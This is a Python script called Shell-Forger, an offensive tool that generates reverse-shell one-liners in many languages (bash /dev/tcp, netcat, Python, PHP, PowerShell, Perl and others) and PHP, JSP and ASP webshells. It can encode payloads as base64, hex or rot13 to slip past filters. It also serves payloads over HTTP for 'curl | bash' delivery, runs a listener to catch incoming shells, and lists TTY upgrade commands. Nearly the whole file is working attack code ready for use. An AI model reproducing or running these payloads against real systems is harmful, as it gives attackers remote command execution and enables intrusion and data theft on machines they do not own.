#!/usr/bin/env python3

print('''
8""""8                                                                               8""""8                                                                         
8    8 eeee eeee eeee eeeee eeeee    eeeee eeeee  eeeee eeeee eeeee eeee eeeee       8    " eeeee e   e eeeee eeeee eeee eeeee e    e    eeeee eeee    eeeeeee eeee 
8eeee8 8  8 8  8 8    8   " 8   "    8   8 8   8  8   8 8   8   8   8    8   8       8e     8  88 8   8 8   8   8   8    8   " 8    8    8  88 8       8  8  8 8    
88   8 8e   8e   8eee 8eeee 8eeee    8e    8eee8e 8eee8 8e  8   8e  8eee 8e  8       88     8   8 8e  8 8eee8e  8e  8eee 8eeee 8eeee8    8   8 8eee    8e 8  8 8eee 
88   8 88   88   88      88    88    88 "8 88   8 88  8 88  8   88  88   88  8       88   e 8   8 88  8 88   8  88  88      88   88      8   8 88      88 8  8 88   
88   8 88e8 88e8 88ee 8ee88 8ee88    88ee8 88   8 88  8 88  8   88  88ee 88ee8 88    88eee8 8eee8 88ee8 88   8  88  88ee 8ee88   88      8eee8 88      88 8  8 88ee 
                                                                                                                                                                    
''')

import sys
import socket
import http.server
import socketserver
import subprocess
import base64
import urllib.parse
import os
import re
import threading
import signal

# === COLORS ===
C = {
    'G': '\033[92m',  # Green
    'Y': '\033[93m',  # Yellow
    'R': '\033[91m',  # Red
    'B': '\033[94m',  # Blue
    'C': '\033[96m',  # Cyan
    'W': '\033[1m',   # White/Bold
    'N': '\033[0m',   # None/Reset
}

VERSION = "3.0"

def log(msg, color='B'):
    print(f"{C.get(color, '')}{msg}{C['N']}")


# === INPUT VALIDATION ===
def validate_ip(ip):
    """Validate IP address format"""
    # Allow hostnames too
    if re.match(r'^[a-zA-Z0-9][a-zA-Z0-9\-\.]+[a-zA-Z0-9]$', ip):
        return True
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        pass
    try:
        socket.inet_pton(socket.AF_INET6, ip)
        return True
    except (socket.error, OSError):
        pass
    return False


def validate_port(port_str):
    """Validate port number"""
    try:
        port = int(port_str)
        if 1 <= port <= 65535:
            return port
    except (ValueError, TypeError):
        pass
    return None


# === PAYLOAD TEMPLATES ===
PAYLOADS = {
    # --- Linux/Unix ---
    'bash': "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
    'bash_alt': "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    'bash_udp': "bash -i >& /dev/udp/{ip}/{port} 0>&1",
    'nc': "nc -e /bin/bash {ip} {port}",
    'nc_pipe': "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f",
    'nc_busybox': "busybox nc {ip} {port} -e /bin/sh",
    'python': "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
    'python3': "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'",
    'php': "php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
    'perl': "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");}};'",
    'ruby': "ruby -rsocket -e'f=TCPSocket.open(\"{ip}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
    'lua': "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
    'awk': "awk 'BEGIN {{s = \"/inet/tcp/0/{ip}/{port}\"; while(42) {{ do{{ printf \"shell> \" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c)}} }} while(c != \"exit\") close(s)}}}'",
    'socat': "socat TCP:{ip}:{port} EXEC:'/bin/bash',pty,stderr,setsid,sigint,sane",
    # --- Windows ---
    'powershell': "$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
    'powershell_b64': "powershell -e {b64payload}",
    # --- Web/Other ---
    'nodejs': "require('child_process').exec('nc {ip} {port} -e /bin/bash')",
    'golang': "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/s.go && go run /tmp/s.go",
    'groovy': "String host=\"{ip}\";int port={port};String cmd=\"/bin/bash\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}}}}",
    # --- Webshells ---
    'webshell_php': "<?php system($_GET['cmd']); ?>",
    'webshell_php_eval': "<?php eval($_POST['c']); ?>",
    'webshell_jsp': "<% Runtime.getRuntime().exec(request.getParameter(\"cmd\")); %>",
    'webshell_asp': "<%eval request(\"cmd\")%>",
}

# === TTY UPGRADE COMMANDS ===
TTY_UPGRADES = """
=== TTY Shell Upgrade Commands ===
Python:     python3 -c 'import pty; pty.spawn("/bin/bash")'
Script:     script /dev/null -c bash
Expect:     /usr/bin/expect -c 'spawn /bin/bash; interact'
After spawn: Ctrl-Z, then: stty raw -echo; fg
Then:       export TERM=xterm && stty rows 50 cols 200
"""


# === PAYLOAD GENERATION ===
def generate_payload(shell_type, ip, port, encode=None):
    """Generate payload with optional encoding"""
    if shell_type not in PAYLOADS:
        return None

    payload = PAYLOADS[shell_type].format(ip=ip, port=port)

    if encode == 'base64':
        encoded = base64.b64encode(payload.encode()).decode()
        if shell_type in ['bash', 'bash_alt']:
            payload = f"echo {encoded} | base64 -d | bash"
        elif shell_type in ['python', 'python3']:
            payload = f"python3 -c 'import base64; exec(base64.b64decode(\"{encoded}\"))'"
        elif shell_type == 'powershell':
            # PowerShell uses UTF-16LE for -EncodedCommand
            ps_b64 = base64.b64encode(payload.encode('utf-16-le')).decode()
            payload = f"powershell -EncodedCommand {ps_b64}"
        else:
            payload = f"echo '{encoded}' | base64 -d | sh"

    elif encode == 'url':
        payload = urllib.parse.quote(payload)

    elif encode == 'hex':
        payload = payload.encode().hex()

    elif encode == 'rot13':
        import codecs
        payload = codecs.encode(payload, 'rot13')

    return payload


# === CLIPBOARD COPY ===
def copy_to_clipboard(text):
    """Copy to clipboard (cross-platform)"""
    clipboard_tools = [
        ['pbcopy'],                           # macOS
        ['xclip', '-selection', 'clipboard'],  # Linux X11
        ['xsel', '--clipboard', '--input'],    # Linux X11 alt
        ['wl-copy'],                           # Wayland
    ]

    for tool_cmd in clipboard_tools:
        try:
            subprocess.run(tool_cmd, input=text.encode(), check=True,
                           capture_output=True, timeout=5)
            return True
        except (subprocess.CalledProcessError, FileNotFoundError,
                subprocess.TimeoutExpired):
            continue

    return False


# === HTTP SERVER ===
class PayloadHandler(http.server.SimpleHTTPRequestHandler):
    """Custom HTTP handler for serving payloads"""
    payload_content = ""

    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/plain')
        self.send_header('Content-Length', str(len(self.payload_content)))
        self.end_headers()
        self.wfile.write(self.payload_content.encode())
        log(f"[+] Payload delivered to {self.client_address[0]}", "G")

    def log_message(self, format, *args):
        """Suppress default logging"""
        pass


def serve_payload(payload, port=8000, filename='shell.sh'):
    """Serve payload via HTTP"""
    PayloadHandler.payload_content = payload

    log(f"\n[*] Starting HTTP server on port {port}...", "B")
    log(f"[*] Payload URL: http://0.0.0.0:{port}/{filename}", "C")
    log(f"[*] Download with: curl http://<YOUR_IP>:{port}/{filename} | bash\n", "Y")

    try:
        server = socketserver.TCPServer(("", port), PayloadHandler)
        server.allow_reuse_address = True
        server.serve_forever()
    except OSError as e:
        if e.errno == 98:
            log(f"[!] Port {port} already in use", "R")
        else:
            log(f"[!] Server error: {e}", "R")
    except KeyboardInterrupt:
        log("\n[*] Server stopped", "Y")


# === NETCAT LISTENER ===
def start_listener(bind_addr='0.0.0.0', port=4444):
    """Start netcat-style listener"""
    log(f"\n[*] Starting listener on {bind_addr}:{port}...", "B")
    log("[*] Waiting for connection...\n", "Y")

    server = None
    conn = None

    def signal_handler(sig, frame):
        log("\n[*] Listener stopped", "Y")
        if conn:
            try:
                conn.close()
            except Exception:
                pass
        if server:
            try:
                server.close()
            except Exception:
                pass
        sys.exit(0)

    signal.signal(signal.SIGINT, signal_handler)

    try:
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.settimeout(None)
        server.bind((bind_addr, port))
        server.listen(1)

        conn, addr = server.accept()
        log(f"[+] Connection from {addr[0]}:{addr[1]}", "G")

        def receive():
            while True:
                try:
                    data = conn.recv(4096)
                    if not data:
                        log("\n[*] Connection closed by remote", "Y")
                        break
                    sys.stdout.write(data.decode('utf-8', errors='replace'))
                    sys.stdout.flush()
                except (ConnectionResetError, BrokenPipeError):
                    log("\n[*] Connection reset by remote", "Y")
                    break
                except Exception:
                    break

        def send():
            while True:
                try:
                    cmd = input()
                    conn.send((cmd + '\n').encode())
                except (EOFError, KeyboardInterrupt):
                    break
                except (BrokenPipeError, ConnectionResetError):
                    break

        # Start threads
        recv_thread = threading.Thread(target=receive, daemon=True)
        recv_thread.start()
        send()

    except OSError as e:
        if e.errno == 98:
            log(f"[!] Port {port} already in use", "R")
        else:
            log(f"[!] Listener error: {e}", "R")
    finally:
        if conn:
            try:
                conn.close()
            except Exception:
                pass
        if server:
            try:
                server.close()
            except Exception:
                pass


# === SHOW HELP ===
def show_help():
    log(f"\n--- Enhanced Shell Forger v{VERSION} ---\n", "W")
    log("Usage: ./Shell-Forger.py <mode> [options]\n", "R")
    log("Modes:", "W")
    print(f"  {C['B']}gen{C['N']}     <ip> <port> [type] [encoding]  - Generate payload")
    print(f"  {C['B']}serve{C['N']}   <ip> <port> [type] [http_port] - Serve payload via HTTP")
    print(f"  {C['B']}listen{C['N']}  [port] [--bind=ADDR]           - Start listener")
    print(f"  {C['B']}list{C['N']}                                   - List all payload types")
    print(f"  {C['B']}tty{C['N']}                                    - Show TTY upgrade commands")
    print(f"  {C['B']}all{C['N']}     <ip> <port>                    - Print ALL payloads\n")

    log("Shell Types:", "W")
    types = list(PAYLOADS.keys())
    # Print in columns
    cols = 4
    for i in range(0, len(types), cols):
        row = types[i:i + cols]
        print("  " + "  ".join(f"{t:<18}" for t in row))
    print()

    log("Encodings:", "W")
    print("  base64, url, hex, rot13\n")

    log("Options:", "W")
    print("  --output FILE    Save payload to file")
    print("  --bind=ADDR      Bind address for listener (default: 0.0.0.0)")
    print("  -h, --help       Show this help")
    print("  -v, --version    Show version\n")

    log("Examples:", "Y")
    print("  ./Shell-Forger.py gen 10.10.10.10 4444 bash base64")
    print("  ./Shell-Forger.py serve 10.10.10.10 4444 bash 8000")
    print("  ./Shell-Forger.py listen 4444")
    print("  ./Shell-Forger.py all 10.10.10.10 4444")
    print("  ./Shell-Forger.py gen 10.10.10.10 4444 powershell base64 --output payload.ps1\n")
    sys.exit(0)


# === MAIN ===
def main():
    if len(sys.argv) < 2 or sys.argv[1] in ('-h', '--help'):
        show_help()

    if sys.argv[1] in ('-v', '--version'):
        print(f"Shell-Forger v{VERSION}")
        sys.exit(0)

    mode = sys.argv[1]

    # Parse global options
    output_file = None
    bind_addr = '0.0.0.0'
    for arg in sys.argv[2:]:
        if arg.startswith('--output='):
            output_file = arg.split('=', 1)[1]
        elif arg.startswith('--bind='):
            bind_addr = arg.split('=', 1)[1]

    if mode == 'gen':
        if len(sys.argv) < 4:
            log("[!] Usage: gen <ip> <port> [type] [encoding]", "R")
            sys.exit(1)

        ip = sys.argv[2]
        if not validate_ip(ip):
            log(f"[!] Invalid IP/hostname: {ip}", "R")
            sys.exit(1)

        port = validate_port(sys.argv[3])
        if port is None:
            log(f"[!] Invalid port: {sys.argv[3]} (must be 1-65535)", "R")
            sys.exit(1)

        shell_type = sys.argv[4] if len(sys.argv) > 4 and not sys.argv[4].startswith('--') else 'bash'
        encoding = sys.argv[5] if len(sys.argv) > 5 and not sys.argv[5].startswith('--') else None

        payload = generate_payload(shell_type, ip, port, encoding)

        if not payload:
            log(f"[!] Unknown shell type: {shell_type}", "R")
            log("    Run './Shell-Forger.py list' for available types", "C")
            sys.exit(1)

        log(f"[+] Payload ({shell_type}):", "G")
        print(f"\n{payload}\n")

        if output_file:
            try:
                with open(output_file, 'w') as f:
                    f.write(payload + '\n')
                log(f"[✓] Saved to {output_file}", "G")
            except PermissionError:
                log(f"[!] Permission denied: {output_file}", "R")

        if copy_to_clipboard(payload):
            log("[✓] Copied to clipboard!", "G")
        else:
            log("[!] Clipboard copy failed (install xclip/xsel/pbcopy)", "Y")

    elif mode == 'serve':
        if len(sys.argv) < 4:
            log("[!] Usage: serve <ip> <port> [type] [http_port]", "R")
            sys.exit(1)

        ip = sys.argv[2]
        if not validate_ip(ip):
            log(f"[!] Invalid IP/hostname: {ip}", "R")
            sys.exit(1)

        port = validate_port(sys.argv[3])
        if port is None:
            log(f"[!] Invalid port: {sys.argv[3]}", "R")
            sys.exit(1)

        shell_type = sys.argv[4] if len(sys.argv) > 4 and not sys.argv[4].startswith('--') else 'bash'
        http_port = validate_port(sys.argv[5]) if len(sys.argv) > 5 and not sys.argv[5].startswith('--') else 8000
        if http_port is None:
            http_port = 8000

        payload = generate_payload(shell_type, ip, port)

        if not payload:
            log(f"[!] Unknown shell type: {shell_type}", "R")
            sys.exit(1)

        serve_payload(payload, http_port)

    elif mode == 'listen':
        listen_port = 4444
        if len(sys.argv) >= 3 and not sys.argv[2].startswith('--'):
            listen_port = validate_port(sys.argv[2])
            if listen_port is None:
                log(f"[!] Invalid port: {sys.argv[2]}", "R")
                sys.exit(1)

        start_listener(bind_addr, listen_port)

    elif mode == 'list':
        log("\n[*] Available payload types:\n", "W")
        for name in sorted(PAYLOADS.keys()):
            preview = PAYLOADS[name][:80]
            print(f"  {C['C']}{name:<18}{C['N']} {preview}...")
        print()

    elif mode == 'tty':
        print(TTY_UPGRADES)

    elif mode == 'all':
        if len(sys.argv) < 4:
            log("[!] Usage: all <ip> <port>", "R")
            sys.exit(1)

        ip = sys.argv[2]
        if not validate_ip(ip):
            log(f"[!] Invalid IP/hostname: {ip}", "R")
            sys.exit(1)

        port = validate_port(sys.argv[3])
        if port is None:
            log(f"[!] Invalid port: {sys.argv[3]}", "R")
            sys.exit(1)

        log(f"\n[*] All payloads for {ip}:{port}\n", "W")
        for name in sorted(PAYLOADS.keys()):
            payload = generate_payload(name, ip, port)
            if payload:
                log(f"\n=== {name} ===", "C")
                print(payload)

    else:
        log(f"[!] Unknown mode: {mode}", "R")
        log("    Run './Shell-Forger.py --help' for usage", "C")
        sys.exit(1)


if __name__ == "__main__":
    main()
